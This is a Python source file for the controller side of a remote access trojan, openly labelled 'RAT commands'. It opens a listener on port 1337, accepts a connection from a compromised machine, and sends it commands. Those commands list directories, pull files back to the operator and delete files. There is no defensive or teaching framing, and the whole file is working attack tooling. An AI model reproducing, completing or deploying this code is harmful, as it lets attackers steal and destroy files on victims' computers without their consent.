#Imports
import os, socket, pprint
from colorama import Fore
from rich.console import Console
from rich.table import Table

#Setting up rich
help_table = Table(title="RAT commands")
console = Console()

#Setting up socket
s = socket.socket()
host = socket.gethostname()
port = 1337
s.bind((host, port))
print('')
print(' Server is currently running @ ', host)
print('')
print(' Waiting for any incoming connections...')
s.listen(1)
conn, addr = s.accept()
print('')
print(addr, ' Has connected to the server succesfully ') #Connection has been set

def helper():
        print("")
        help_table.add_column("Command", justify= "center",style="cyan")
        help_table.add_column("Description", justify='center', style="green")

        help_table.add_row("cwd", "Shows the current working directory of the program")
        help_table.add_row("ls", "Shows the files present in the current working directory of the program")
        help_table.add_row("dir", "Shows all the present directories and files in the current working directory of the program")
        help_table.add_row("cd", "Shows all the present directories and files of the given directory")
        help_table.add_row("df", "BETA/UNSTABLE. USE AT YOUR OWN RISK. Downloads a .txt file from the given path")
        help_table.add_row("rmf", "Remove file from the given directory")
        help_table.add_row("cls", "Clears the screen of the server terminal")
        console.print(help_table)

#Commands
running = True
while running:
    print("")
    print(f"Welcome to the terminal. Type \"{Fore.GREEN}help{Fore.RESET}\" to get all the basic commands")
    command = input(str("Command >> "))

    if command == "help":
        helper()

    elif command == "cwd":
        conn.send(command.encode())
        print('')
        print("Command sent, waiting for execution..")
        print('')
        cwd = conn.recv(5000)
        cwd = cwd.decode()
        print("Command Output: ", cwd)

    elif command == "ls":
        conn.send(command.encode())
        print('')
        print("Command sent, waiting for execution..")
        print('')
        vfiles = conn.recv(5000)
        vfiles = vfiles.decode()
        print("Command Output: \n", vfiles)

    elif command == "dir":
        conn.send(command.encode())
        print('')
        print("Command sent, waiting for execution..")
        print('')
        vdir = conn.recv(5000)
        vdir = vdir.decode()
        print("Command Output: \n")
        pprint.pprint(vdir)

    elif command == "cd":
        conn.send(command.encode())
        print('')
        print("Command sent, waiting for execution..")
        print('')
        csdir = str(input("Custom Directory: "))
        conn.send(csdir.encode())
        cdir = conn.recv(5000)
        cdir = cdir.decode()
        print("Command Output: \n", cdir)

    elif command == "df":
        conn.send(command.encode())
        filepath = str(input("Please enter the filepath including the filename: "))
        conn.send(filepath.encode())
        data = conn.recv(1000000)
        filename = str(input("Please enter the file name for incoming file along with the extension: "))
        file = open(filename, 'wb')
        file.write(data)
        file.close()
        print("Success!")

    elif command == "rmf":
        conn.send(command.encode())
        filepath = str(input("Please enter the filepath including the filename: "))
        conn.send(filepath.encode())
        print('')
        print("File removed successfully!")

    elif command == "cls":
        os.system('CLS')
    elif command == "exit":
        conn.send(command.encode())
        running = False

    else:
        print("")
        print("Command not recognised")